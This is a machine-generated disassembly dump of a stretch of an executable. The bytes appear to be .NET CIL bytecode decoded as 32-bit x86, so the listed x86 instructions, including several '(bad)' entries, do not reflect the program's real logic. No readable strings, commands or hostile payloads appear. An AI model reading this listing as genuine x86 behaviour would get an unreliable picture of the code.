  4025c6:	16                   	push   %ss
  4025c7:	00 00                	add    %al,(%eax)
  4025c9:	04 de                	add    $0xde,%al
  4025cb:	18 06                	sbb    %al,(%esi)
  4025cd:	16                   	push   %ss
  4025ce:	2f                   	das
  4025cf:	13 02                	adc    (%edx),%eax
  4025d1:	7b 14                	jnp    0x4025e7
  4025d3:	00 00                	add    %al,(%eax)
  4025d5:	04 2c                	add    $0x2c,%al
  4025d7:	0b 02                	or     (%edx),%eax
  4025d9:	7b 14                	jnp    0x4025ef
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	04 6f                	add    $0x6f,%al
  4025df:	3a 00                	cmp    (%eax),%al
  4025e1:	00 0a                	add    %cl,(%edx)
  4025e3:	dc 02                	faddl  (%edx)
  4025e5:	14 7d                	adc    $0x7d,%al
  4025e7:	14 00                	adc    $0x0,%al
  4025e9:	00 04 de             	add    %al,(%esi,%ebx,8)
  4025ec:	18 06                	sbb    %al,(%esi)
  4025ee:	16                   	push   %ss
  4025ef:	2f                   	das
  4025f0:	13 02                	adc    (%edx),%eax
  4025f2:	7b 13                	jnp    0x402607
  4025f4:	00 00                	add    %al,(%eax)
  4025f6:	04 2c                	add    $0x2c,%al
  4025f8:	0b 02                	or     (%edx),%eax
  4025fa:	7b 13                	jnp    0x40260f
  4025fc:	00 00                	add    %al,(%eax)
  4025fe:	04 6f                	add    $0x6f,%al
  402600:	3a 00                	cmp    (%eax),%al
  402602:	00 0a                	add    %cl,(%edx)
  402604:	dc 02                	faddl  (%edx)
  402606:	14 7d                	adc    $0x7d,%al
  402608:	13 00                	adc    (%eax),%eax
  40260a:	00 04 de             	add    %al,(%esi,%ebx,8)
  40260d:	18 06                	sbb    %al,(%esi)
  40260f:	16                   	push   %ss
  402610:	2f                   	das
  402611:	13 02                	adc    (%edx),%eax
  402613:	7b 10                	jnp    0x402625
  402615:	00 00                	add    %al,(%eax)
  402617:	04 2c                	add    $0x2c,%al
  402619:	0b 02                	or     (%edx),%eax
  40261b:	7b 10                	jnp    0x40262d
  40261d:	00 00                	add    %al,(%eax)
  40261f:	04 6f                	add    $0x6f,%al
  402621:	3a 00                	cmp    (%eax),%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	dc 02                	faddl  (%edx)
  402627:	14 7d                	adc    $0x7d,%al
  402629:	10 00                	adc    %al,(%eax)
  40262b:	00 04 de             	add    %al,(%esi,%ebx,8)
  40262e:	19 13                	sbb    %edx,(%ebx)
  402630:	0b 02                	or     (%edx),%eax
  402632:	1f                   	pop    %ds
  402633:	fe                   	(bad)
  402634:	7d 0b                	jge    0x402641
  402636:	00 00                	add    %al,(%eax)
  402638:	04 02                	add    $0x2,%al
  40263a:	7c 0c                	jl     0x402648
  40263c:	00 00                	add    %al,(%eax)
  40263e:	04 11                	add    $0x11,%al
  402640:	0b 28                	or     (%eax),%ebp
  402642:	3b 00                	cmp    (%eax),%eax
  402644:	00 0a                	add    %cl,(%edx)
  402646:	de 13                	ficoms (%ebx)
  402648:	02 1f                	add    (%edi),%bl
  40264a:	fe                   	(bad)
  40264b:	7d 0b                	jge    0x402658
  40264d:	00 00                	add    %al,(%eax)
  40264f:	04 02                	add    $0x2,%al
  402651:	7c 0c                	jl     0x40265f
  402653:	00 00                	add    %al,(%eax)
  402655:	04 28                	add    $0x28,%al
  402657:	3c 00                	cmp    $0x0,%al
  402659:	00 0a                	add    %cl,(%edx)
  40265b:	2a 41 64             	sub    0x64(%ecx),%al
  40265e:	00 00                	add    %al,(%eax)
  402660:	02 00                	add    (%eax),%al
  402662:	00 00                	add    %al,(%eax)
  402664:	4c                   	dec    %esp
  402665:	01 00                	add    %eax,(%eax)
  402667:	00 a8 01 00 00 f4    	add    %ch,-0xbffffff(%eax)
  40266d:	02 00                	add    (%eax),%al
  40266f:	00 18                	add    %bl,(%eax)
  402671:	00 00                	add    %al,(%eax)
  402673:	00 00                	add    %al,(%eax)
  402675:	00 00                	add    %al,(%eax)
  402677:	00 02                	add    %al,(%edx)
  402679:	00 00                	add    %al,(%eax)
  40267b:	00 cf                	add    %cl,%bh
  40267d:	00 00                	add    %al,(%eax)
  40267f:	00 46 02             	add    %al,0x2(%esi)
  402682:	00 00                	add    %al,(%eax)
  402684:	15 03 00 00 18       	adc    $0x18000003,%eax
  402689:	00 00                	add    %al,(%eax)
  40268b:	00 00                	add    %al,(%eax)
  40268d:	00 00                	add    %al,(%eax)
  40268f:	00 02                	add    %al,(%edx)
  402691:	00 00                	add    %al,(%eax)
  402693:	00 86 00 00 00 b0    	add    %al,-0x50000000(%esi)
  402699:	02 00                	add    (%eax),%al
  40269b:	00 36                	add    %dh,(%esi)
  40269d:	03 00                	add    (%eax),%eax
  40269f:	00 18                	add    %bl,(%eax)
	...
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 0e                	add    %cl,(%esi)
  4026ad:	00 00                	add    %al,(%eax)
  4026af:	00 49 03             	add    %cl,0x3(%ecx)
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	57                   	push   %edi
  4026b5:	03 00                	add    (%eax),%eax
  4026b7:	00 19                	add    %bl,(%ecx)
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	00 28                	add    %ch,(%eax)
  4026bd:	00 00                	add    %al,(%eax)
  4026bf:	01 36                	add    %esi,(%esi)
  4026c1:	02 7c 0c 00          	add    0x0(%esp,%ecx,1),%bh
  4026c5:	00 04 03             	add    %al,(%ebx,%eax,1)
  4026c8:	28 3e                	sub    %bh,(%esi)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	0a 2a                	or     (%edx),%ch
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	1b 30                	sbb    (%eax),%esi
  4026d2:	05 00 bf 01 00       	add    $0x1bf00,%eax
  4026d7:	00 06                	add    %al,(%esi)
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	11 02                	adc    %eax,(%edx)
  4026dd:	7b 1b                	jnp    0x4026fa
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	04 0a                	add    $0xa,%al
  4026e3:	02 7b 1d             	add    0x1d(%ebx),%bh
  4026e6:	00 00                	add    %al,(%eax)
  4026e8:	04 0b                	add    $0xb,%al
  4026ea:	06                   	push   %es
  4026eb:	17                   	pop    %ss
  4026ec:	36 38 07             	cmp    %al,%ss:(%edi)
  4026ef:	7b 09                	jnp    0x4026fa
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	04 2c                	add    $0x2c,%al
  4026f5:	05 dd 8c 01 00       	add    $0x18cdd,%eax
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	07                   	pop    %es
  4026fd:	28 16                	sub    %dl,(%esi)
  4026ff:	00 00                	add    %al,(%eax)
  402701:	06                   	push   %es
  402702:	de 03                	fiadds (%ebx)
  402704:	26 de 00             	fiadds %es:(%eax)
  402707:	07                   	pop    %es
  402708:	17                   	pop    %ss
  402709:	8d 0b                	lea    (%ebx),%ecx
  40270b:	00 00                	add    %al,(%eax)
  40270d:	01 25 16 72 01 01    	add    %esp,0x1017216
  402713:	00 70 a2             	add    %dh,-0x5e(%eax)
  402716:	28 0e                	sub    %cl,(%esi)
  402718:	00 00                	add    %al,(%eax)
  40271a:	06                   	push   %es
  40271b:	02 28                	add    (%eax),%ch
  40271d:	39 00                	cmp    %eax,(%eax)
  40271f:	00 06                	add    %al,(%esi)
  402721:	7d 1f                	jge    0x402742
  402723:	00 00                	add    %al,(%eax)
  402725:	04 00                	add    $0x0,%al
  402727:	06                   	push   %es
  402728:	2c 07                	sub    $0x7,%al
  40272a:	06                   	push   %es
  40272b:	17                   	pop    %ss
  40272c:	3b c7                	cmp    %edi,%eax
  40272e:	00 00                	add    %al,(%eax)
  402730:	00 00                	add    %al,(%eax)
  402732:	06                   	push   %es
  402733:	2c 49                	sub    $0x49,%al
  402735:	07                   	pop    %es
  402736:	07                   	pop    %es
  402737:	7b 07                	jnp    0x402740
  402739:	00 00                	add    %al,(%eax)
  40273b:	04 02                	add    $0x2,%al
  40273d:	7b 1f                	jnp    0x40275e
  40273f:	00 00                	add    %al,(%eax)
  402741:	04 6f                	add    $0x6f,%al
  402743:	37                   	aaa
  402744:	00 00                	add    %al,(%eax)
  402746:	06                   	push   %es
  402747:	28 17                	sub    %dl,(%edi)
  402749:	00 00                	add    %al,(%eax)
  40274b:	06                   	push   %es
  40274c:	6f                   	outsl  %ds:(%esi),(%dx)
  40274d:	32 00                	xor    (%eax),%al
  40274f:	00 0a                	add    %cl,(%edx)
  402751:	0c 12                	or     $0x12,%al
  402753:	02 28                	add    (%eax),%ch
  402755:	33 00                	xor    (%eax),%eax
  402757:	00 0a                	add    %cl,(%edx)
  402759:	2d 3f 02 16 25       	sub    $0x2516023f,%eax
  40275e:	0a 7d 1b             	or     0x1b(%ebp),%bh
  402761:	00 00                	add    %al,(%eax)
  402763:	04 02                	add    $0x2,%al
  402765:	08 7d 20             	or     %bh,0x20(%ebp)
  402768:	00 00                	add    %al,(%eax)
  40276a:	04 02                	add    $0x2,%al
  40276c:	7c 1c                	jl     0x40278a
  40276e:	00 00                	add    %al,(%eax)
  402770:	04 12                	add    $0x12,%al
  402772:	02 02                	add    (%edx),%al
  402774:	28 07                	sub    %al,(%edi)
  402776:	00 00                	add    %al,(%eax)
  402778:	2b dd                	sub    %ebp,%ebx
  40277a:	1c 01                	sbb    $0x1,%al
  40277c:	00 00                	add    %al,(%eax)
  40277e:	02 7b 20             	add    0x20(%ebx),%bh
  402781:	00 00                	add    %al,(%eax)
  402783:	04 0c                	add    $0xc,%al
  402785:	02 7c 20 00          	add    0x0(%eax,%eiz,1),%bh
  402789:	00 04 fe             	add    %al,(%esi,%edi,8)
  40278c:	15 26 00 00 01       	adc    $0x1000026,%eax
  402791:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  402797:	00 00                	add    %al,(%eax)
  402799:	04 12                	add    $0x12,%al
  40279b:	02 28                	add    (%eax),%ch
  40279d:	34 00                	xor    $0x0,%al
  40279f:	00 0a                	add    %cl,(%edx)
  4027a1:	de 11                	ficoms (%ecx)
  4027a3:	26 07                	es pop %es
  4027a5:	72 f1                	jb     0x402798
  4027a7:	01 00                	add    %eax,(%eax)
  4027a9:	70 28                	jo     0x4027d3
  4027ab:	11 00                	adc    %eax,(%eax)
  4027ad:	00 06                	add    %al,(%esi)
  4027af:	dd d3                	fst    %st(3)
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	00 07                	add    %al,(%edi)
  4027b5:	28 10                	sub    %dl,(%eax)
  4027b7:	00 00                	add    %al,(%eax)
  4027b9:	06                   	push   %es
  4027ba:	02 7b 1f             	add    0x1f(%ebx),%bh
  4027bd:	00 00                	add    %al,(%eax)
  4027bf:	04 17                	add    $0x17,%al
  4027c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c2:	3b 00                	cmp    (%eax),%eax
  4027c4:	00 06                	add    %al,(%esi)
  4027c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c7:	42                   	inc    %edx
  4027c8:	00 00                	add    %al,(%eax)
  4027ca:	0a 0d 12 03 28 43    	or     0x43280312,%cl
  4027d0:	00 00                	add    %al,(%eax)
  4027d2:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  4027d8:	0a 7d 1b             	or     0x1b(%ebp),%bh
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	04 02                	add    $0x2,%al
  4027df:	09 7d 21             	or     %edi,0x21(%ebp)
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	04 02                	add    $0x2,%al
  4027e6:	7c 1c                	jl     0x402804
  4027e8:	00 00                	add    %al,(%eax)
  4027ea:	04 12                	add    $0x12,%al
  4027ec:	03 02                	add    (%edx),%eax
  4027ee:	28 08                	sub    %cl,(%eax)
  4027f0:	00 00                	add    %al,(%eax)
  4027f2:	2b dd                	sub    %ebp,%ebx
  4027f4:	a2 00 00 00 02       	mov    %al,0x2000000
  4027f9:	7b 21                	jnp    0x40281c
  4027fb:	00 00                	add    %al,(%eax)
  4027fd:	04 0d                	add    $0xd,%al
  4027ff:	02 7c 21 00          	add    0x0(%ecx,%eiz,1),%bh
  402803:	00 04 fe             	add    %al,(%esi,%edi,8)
  402806:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  40280b:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  402811:	00 00                	add    %al,(%eax)
  402813:	04 12                	add    $0x12,%al
  402815:	03 28                	add    (%eax),%ebp
  402817:	44                   	inc    %esp
  402818:	00 00                	add    %al,(%eax)
  40281a:	0a 2d 0d 07 72 0f    	or     0xf72070d,%ch
  402820:	02 00                	add    (%eax),%al
  402822:	70 28                	jo     0x40284c
  402824:	11 00                	adc    %eax,(%eax)
  402826:	00 06                	add    %al,(%esi)
  402828:	de 5d 72             	ficomps 0x72(%ebp)
  40282b:	35 02 00 70 02       	xor    $0x2700002,%eax
  402830:	7b 1e                	jnp    0x402850
  402832:	00 00                	add    %al,(%eax)
  402834:	04 28                	add    $0x28,%al
  402836:	45                   	inc    %ebp
  402837:	00 00                	add    %al,(%eax)
  402839:	0a 28                	or     (%eax),%ch
  40283b:	1c 00                	sbb    $0x0,%al
  40283d:	00 06                	add    %al,(%esi)
  40283f:	26 de 18             	ficomps %es:(%eax)
  402842:	06                   	push   %es
  402843:	16                   	push   %ss
  402844:	2f                   	das
  402845:	13 02                	adc    (%edx),%eax
  402847:	7b 1f                	jnp    0x402868
  402849:	00 00                	add    %al,(%eax)
  40284b:	04 2c                	add    $0x2c,%al
  40284d:	0b 02                	or     (%edx),%eax
  40284f:	7b 1f                	jnp    0x402870
  402851:	00 00                	add    %al,(%eax)
  402853:	04 6f                	add    $0x6f,%al
  402855:	3a 00                	cmp    (%eax),%al
  402857:	00 0a                	add    %cl,(%edx)
  402859:	dc 02                	faddl  (%edx)
  40285b:	14 7d                	adc    $0x7d,%al
  40285d:	1f                   	pop    %ds
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 07                	add    $0x7,%al
  402862:	7b 05                	jnp    0x402869
  402864:	00 00                	add    %al,(%eax)
  402866:	04 6f                	add    $0x6f,%al
  402868:	23 00                	and    (%eax),%eax
  40286a:	00 06                	add    %al,(%esi)
  40286c:	de 19                	ficomps (%ecx)
  40286e:	13 04 02             	adc    (%edx,%eax,1),%eax
  402871:	1f                   	pop    %ds
  402872:	fe                   	(bad)
  402873:	7d 1b                	jge    0x402890
  402875:	00 00                	add    %al,(%eax)
  402877:	04 02                	add    $0x2,%al
  402879:	7c 1c                	jl     0x402897
  40287b:	00 00                	add    %al,(%eax)
  40287d:	04 11                	add    $0x11,%al
  40287f:	04 28                	add    $0x28,%al
  402881:	46                   	inc    %esi
  402882:	00 00                	add    %al,(%eax)
  402884:	0a de                	or     %dh,%bl
  402886:	13 02                	adc    (%edx),%eax
  402888:	1f                   	pop    %ds
  402889:	fe                   	(bad)
  40288a:	7d 1b                	jge    0x4028a7
  40288c:	00 00                	add    %al,(%eax)
  40288e:	04 02                	add    $0x2,%al
  402890:	7c 1c                	jl     0x4028ae
  402892:	00 00                	add    %al,(%eax)
  402894:	04 28                	add    $0x28,%al
  402896:	47                   	inc    %edi
  402897:	00 00                	add    %al,(%eax)
  402899:	0a 2a                	or     (%edx),%ch
  40289b:	00 41 64             	add    %al,0x64(%ecx)
  40289e:	00 00                	add    %al,(%eax)
  4028a0:	00 00                	add    %al,(%eax)
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	20 00                	and    %al,(%eax)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	08 00                	or     %al,(%eax)
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	28 00                	sub    %al,(%eax)
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	03 00                	add    (%eax),%eax
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	0b 00                	or     (%eax),%eax
  4028b6:	00 01                	add    %al,(%ecx)
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	00 00                	add    %al,(%eax)
  4028bc:	56                   	push   %esi
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	00 71 00             	add    %dh,0x0(%ecx)
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	c7 00 00 00 11 00    	movl   $0x110000,(%eax)
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	0b 00                	or     (%eax),%eax
  4028ce:	00 01                	add    %al,(%ecx)
  4028d0:	02 00                	add    (%eax),%al
  4028d2:	00 00                	add    %al,(%eax)
  4028d4:	4b                   	dec    %ebx
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	00 1b                	add    %bl,(%ebx)
  4028d9:	01 00                	add    %eax,(%eax)
  4028db:	00 66 01             	add    %ah,0x1(%esi)
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	18 00                	sbb    %al,(%eax)
	...
  4028ea:	00 00                	add    %al,(%eax)
  4028ec:	0e                   	push   %cs
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	00 84 01 00 00 92 01 	add    %al,0x1920000(%ecx,%eax,1)
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	19 00                	sbb    %eax,(%eax)
  4028fa:	00 00                	add    %al,(%eax)
  4028fc:	28 00                	sub    %al,(%eax)
  4028fe:	00 01                	add    %al,(%ecx)
  402900:	36 02 7c 1c 00       	add    %ss:0x0(%esp,%ebx,1),%bh
  402905:	00 04 03             	add    %al,(%ebx,%eax,1)
  402908:	28 48 00             	sub    %cl,0x0(%eax)
  40290b:	00 0a                	add    %cl,(%edx)
  40290d:	2a 00                	sub    (%eax),%al
  40290f:	00 1b                	add    %bl,(%ebx)
  402911:	30 04 00             	xor    %al,(%eax,%eax,1)
  402914:	54                   	push   %esp
  402915:	00 00                	add    %al,(%eax)
  402917:	00 07                	add    %al,(%edi)
  402919:	00 00                	add    %al,(%eax)
  40291b:	11 1f                	adc    %ebx,(%edi)
  40291d:	1c 28                	sbb    $0x28,%al
  40291f:	13 00                	adc    (%eax),%eax
  402921:	00 0a                	add    %cl,(%edx)
  402923:	0a 06                	or     (%esi),%al
  402925:	28 49 00             	sub    %cl,0x0(%ecx)
  402928:	00 0a                	add    %cl,(%edx)
  40292a:	2c 0b                	sub    $0xb,%al
  40292c:	02 28                	add    (%eax),%ch
  40292e:	4a                   	dec    %edx
  40292f:	00 00                	add    %al,(%eax)
  402931:	0a 26                	or     (%esi),%ah
  402933:	17                   	pop    %ss
  402934:	0b de                	or     %esi,%ebx
  402936:	37                   	aaa
  402937:	00 06                	add    %al,(%esi)
  402939:	72 47                	jb     0x402982
  40293b:	02 00                	add    (%eax),%al
  40293d:	70 28                	jo     0x402967
  40293f:	45                   	inc    %ebp
  402940:	00 00                	add    %al,(%eax)
  402942:	0a 72 69             	or     0x69(%edx),%dh
  402945:	02 00                	add    (%eax),%al
  402947:	70 02                	jo     0x40294b
  402949:	72 b5                	jb     0x402900
  40294b:	01 00                	add    %eax,(%eax)
  40294d:	70 28                	jo     0x402977
  40294f:	19 00                	sbb    %eax,(%eax)
  402951:	00 0a                	add    %cl,(%edx)
  402953:	28 4b 00             	sub    %cl,0x0(%ebx)
  402956:	00 0a                	add    %cl,(%edx)
  402958:	26 de 0a             	fimuls %es:(%edx)
  40295b:	26 02 28             	add    %es:(%eax),%ch
  40295e:	4a                   	dec    %edx
  40295f:	00 00                	add    %al,(%eax)
  402961:	0a 26                	or     (%esi),%ah
  402963:	de 00                	fiadds (%eax)
  402965:	17                   	pop    %ss
  402966:	0b de                	or     %esi,%ebx
  402968:	05 26 16 0b de       	add    $0xde0b1626,%eax
  40296d:	00 07                	add    %al,(%edi)
  40296f:	2a 01                	sub    (%ecx),%al
  402971:	1c 00                	sbb    $0x0,%al
  402973:	00 00                	add    %al,(%eax)
  402975:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402978:	23 3f                	and    (%edi),%edi
  40297a:	00 0a                	add    %cl,(%edx)
  40297c:	0b 00                	or     (%eax),%eax
  40297e:	00 01                	add    %al,(%ecx)
  402980:	00 00                	add    %al,(%eax)
  402982:	08 00                	or     %al,(%eax)
  402984:	45                   	inc    %ebp
  402985:	4d                   	dec    %ebp
  402986:	00 05 0b 00 00 01    	add    %al,0x100000b
  40298c:	ce                   	into
  40298d:	72 cb                	jb     0x40295a
  40298f:	02 00                	add    (%eax),%al
  402991:	70 80                	jo     0x402913
  402993:	26 00 00             	add    %al,%es:(%eax)
  402996:	04 7e                	add    $0x7e,%al
  402998:	26 00 00             	add    %al,%es:(%eax)
  40299b:	04 72                	add    $0x72,%al
  40299d:	17                   	pop    %ss
  40299e:	03 00                	add    (%eax),%eax
  4029a0:	70 28                	jo     0x4029ca
  4029a2:	4c                   	dec    %esp
  4029a3:	00 00                	add    %al,(%eax)
  4029a5:	0a 6f 4d             	or     0x4d(%edi),%ch
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	0a 72 49             	or     0x49(%edx),%dh
  4029ad:	03 00                	add    (%eax),%eax
  4029af:	70 28                	jo     0x4029d9
  4029b1:	4e                   	dec    %esi
  4029b2:	00 00                	add    %al,(%eax)
  4029b4:	0a 28                	or     (%eax),%ch
  4029b6:	45                   	inc    %ebp
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	0a 80 26 00 00 04    	or     0x4000026(%eax),%al
  4029bf:	2a 1b                	sub    (%ebx),%bl
  4029c1:	30 07                	xor    %al,(%edi)
  4029c3:	00 1c 02             	add    %bl,(%edx,%eax,1)
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	08 00                	or     %al,(%eax)
  4029ca:	00 11                	add    %dl,(%ecx)
  4029cc:	02 17                	add    (%edi),%dl
  4029ce:	7d 28                	jge    0x4029f8
  4029d0:	00 00                	add    %al,(%eax)
  4029d2:	04 02                	add    $0x2,%al
  4029d4:	28 4f 00             	sub    %cl,0x0(%edi)
  4029d7:	00 0a                	add    %cl,(%edx)
  4029d9:	02 28                	add    (%eax),%ch
  4029db:	4f                   	dec    %edi
  4029dc:	00 00                	add    %al,(%eax)
  4029de:	06                   	push   %es
  4029df:	28 50 00             	sub    %dl,0x0(%eax)
  4029e2:	00 0a                	add    %cl,(%edx)
  4029e4:	02 28                	add    (%eax),%ch
  4029e6:	30 00                	xor    %al,(%eax)
  4029e8:	00 06                	add    %al,(%esi)
  4029ea:	02 7e 42             	add    0x42(%esi),%bh
  4029ed:	00 00                	add    %al,(%eax)
  4029ef:	04 72                	add    $0x72,%al
  4029f1:	55                   	push   %ebp
  4029f2:	03 00                	add    (%eax),%eax
  4029f4:	70 72                	jo     0x402a68
  4029f6:	3d 01 00 70 6f       	cmp    $0x6f700001,%eax
  4029fb:	51                   	push   %ecx
  4029fc:	00 00                	add    %al,(%eax)
  4029fe:	0a 6f 52             	or     0x52(%edi),%ch
  402a01:	00 00                	add    %al,(%eax)
  402a03:	0a 18                	or     (%eax),%bl
  402a05:	0a 02                	or     (%edx),%al
  402a07:	28 53 00             	sub    %dl,0x0(%ebx)
  402a0a:	00 0a                	add    %cl,(%edx)
  402a0c:	1f                   	pop    %ds
  402a0d:	21 12                	and    %edx,(%edx)
  402a0f:	00 1a                	add    %bl,(%edx)
  402a11:	28 48 00             	sub    %cl,0x0(%eax)
  402a14:	00 06                	add    %al,(%esi)
  402a16:	2c 22                	sub    $0x22,%al
  402a18:	02 16                	add    (%esi),%dl
  402a1a:	16                   	push   %ss
  402a1b:	02 28                	add    (%eax),%ch
  402a1d:	54                   	push   %esp
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	0a 02                	or     (%edx),%al
  402a22:	28 55 00             	sub    %dl,0x0(%ebp)
  402a25:	00 0a                	add    %cl,(%edx)
  402a27:	1f                   	pop    %ds
  402a28:	14 1f                	adc    $0x1f,%al
  402a2a:	14 28                	adc    $0x28,%al
  402a2c:	49                   	dec    %ecx
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 56 00             	sub    %dl,0x0(%esi)
  402a33:	00 0a                	add    %cl,(%edx)
  402a35:	28 57 00             	sub    %dl,0x0(%edi)
  402a38:	00 0a                	add    %cl,(%edx)
  402a3a:	02 7b 2f             	add    0x2f(%ebx),%bh
  402a3d:	00 00                	add    %al,(%eax)
  402a3f:	04 6f                	add    $0x6f,%al
  402a41:	58                   	pop    %eax
  402a42:	00 00                	add    %al,(%eax)
  402a44:	0a 1f                	or     (%edi),%bl
  402a46:	14 1f                	adc    $0x1f,%al
  402a48:	14 1f                	adc    $0x1f,%al
  402a4a:	14 28                	adc    $0x28,%al
  402a4c:	59                   	pop    %ecx
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	0a 6f 5a             	or     0x5a(%edi),%ch
  402a52:	00 00                	add    %al,(%eax)
  402a54:	0a 02                	or     (%edx),%al
  402a56:	7b 2f                	jnp    0x402a87
  402a58:	00 00                	add    %al,(%eax)
  402a5a:	04 6f                	add    $0x6f,%al
  402a5c:	58                   	pop    %eax
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	0a 1f                	or     (%edi),%bl
  402a61:	28 1f                	sub    %bl,(%edi)
  402a63:	28 1f                	sub    %bl,(%edi)
  402a65:	28 28                	sub    %ch,(%eax)
  402a67:	59                   	pop    %ecx
  402a68:	00 00                	add    %al,(%eax)
  402a6a:	0a 6f 5b             	or     0x5b(%edi),%ch
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 02                	or     (%edx),%al
  402a71:	7b 30                	jnp    0x402aa3
  402a73:	00 00                	add    %al,(%eax)
  402a75:	04 6f                	add    $0x6f,%al
  402a77:	58                   	pop    %eax
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	0a 1f                	or     (%edi),%bl
  402a7c:	14 1f                	adc    $0x1f,%al
  402a7e:	14 1f                	adc    $0x1f,%al
  402a80:	14 28                	adc    $0x28,%al
  402a82:	59                   	pop    %ecx
  402a83:	00 00                	add    %al,(%eax)
  402a85:	0a 6f 5a             	or     0x5a(%edi),%ch
  402a88:	00 00                	add    %al,(%eax)
  402a8a:	0a 02                	or     (%edx),%al
  402a8c:	7b 30                	jnp    0x402abe
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	04 6f                	add    $0x6f,%al
  402a92:	58                   	pop    %eax
  402a93:	00 00                	add    %al,(%eax)
  402a95:	0a 1f                	or     (%edi),%bl
  402a97:	28 1f                	sub    %bl,(%edi)
  402a99:	28 1f                	sub    %bl,(%edi)
  402a9b:	28 28                	sub    %ch,(%eax)
  402a9d:	59                   	pop    %ecx
  402a9e:	00 00                	add    %al,(%eax)
  402aa0:	0a 6f 5b             	or     0x5b(%edi),%ch
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	0a 02                	or     (%edx),%al
  402aa7:	7b 2e                	jnp    0x402ad7
  402aa9:	00 00                	add    %al,(%eax)
  402aab:	04 7e                	add    $0x7e,%al
  402aad:	46                   	inc    %esi
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	04 72                	add    $0x72,%al
  402ab2:	55                   	push   %ebp
  402ab3:	03 00                	add    (%eax),%eax
  402ab5:	70 72                	jo     0x402b29
  402ab7:	3d 01 00 70 6f       	cmp    $0x6f700001,%eax
  402abc:	51                   	push   %ecx
  402abd:	00 00                	add    %al,(%eax)
  402abf:	0a 6f 52             	or     0x52(%edi),%ch
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 02                	or     (%edx),%al
  402ac6:	7b 2f                	jnp    0x402af7
  402ac8:	00 00                	add    %al,(%eax)
  402aca:	04 7e                	add    $0x7e,%al
  402acc:	47                   	inc    %edi
  402acd:	00 00                	add    %al,(%eax)
  402acf:	04 6f                	add    $0x6f,%al
  402ad1:	52                   	push   %edx
  402ad2:	00 00                	add    %al,(%eax)
  402ad4:	0a 02                	or     (%edx),%al
  402ad6:	7b 30                	jnp    0x402b08
  402ad8:	00 00                	add    %al,(%eax)
  402ada:	04 7e                	add    $0x7e,%al
  402adc:	48                   	dec    %eax
  402add:	00 00                	add    %al,(%eax)
  402adf:	04 6f                	add    $0x6f,%al
  402ae1:	52                   	push   %edx
  402ae2:	00 00                	add    %al,(%eax)
  402ae4:	0a 02                	or     (%edx),%al
  402ae6:	7b 32                	jnp    0x402b1a
  402ae8:	00 00                	add    %al,(%eax)
  402aea:	04 7e                	add    $0x7e,%al
  402aec:	43                   	inc    %ebx
  402aed:	00 00                	add    %al,(%eax)
  402aef:	04 6f                	add    $0x6f,%al
  402af1:	52                   	push   %edx
  402af2:	00 00                	add    %al,(%eax)
  402af4:	0a 02                	or     (%edx),%al
  402af6:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  402afa:	0a 13                	or     (%ebx),%dl
  402afc:	05 11 05 6f 5d       	add    $0x5d6f0511,%eax
  402b01:	00 00                	add    %al,(%eax)
  402b03:	0a 0b                	or     (%ebx),%cl
  402b05:	de 0c 11             	fimuls (%ecx,%edx,1)
  402b08:	05 2c 07 11 05       	add    $0x511072c,%eax
  402b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b0e:	3a 00                	cmp    (%eax),%al
  402b10:	00 0a                	add    %cl,(%edx)
  402b12:	dc 02                	faddl  (%edx)
  402b14:	7b 2c                	jnp    0x402b42
  402b16:	00 00                	add    %al,(%eax)
  402b18:	04 6f                	add    $0x6f,%al
  402b1a:	5e                   	pop    %esi
  402b1b:	00 00                	add    %al,(%eax)
  402b1d:	0a 13                	or     (%ebx),%dl
  402b1f:	06                   	push   %es
  402b20:	12 06                	adc    (%esi),%al
  402b22:	28 5f 00             	sub    %bl,0x0(%edi)
  402b25:	00 0a                	add    %cl,(%edx)
  402b27:	0c 02                	or     $0x2,%al
  402b29:	7b 2c                	jnp    0x402b57
  402b2b:	00 00                	add    %al,(%eax)
